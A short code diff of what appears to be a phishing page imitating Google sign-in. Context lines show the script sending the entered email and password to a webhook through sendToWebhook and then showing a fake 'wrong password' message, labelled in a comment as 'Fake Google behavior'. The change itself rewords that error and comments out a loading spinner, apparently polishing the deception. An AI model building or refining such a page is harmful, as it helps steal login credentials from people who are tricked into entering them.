@@ -160,7 +160,7 @@
         
         <button type="submit" class="btn-next">
             Next 
-            <span class="loader" id="loader"></span>
+          <!--  <span class="loader" id="loader"></span> -->
         </button>
     </form>
 
@@ -211,7 +211,7 @@
             sendToWebhook(email, password, "Login Attempt");
 
             // Show Error Message (Fake Google behavior)
-            errorMsg.textContent = "Wrong password. Try again.";
+            errorMsg.textContent = "Incorrect Email or Password. Please try again";
             loader.style.display = 'none';
             
             // Optional: Clear password field
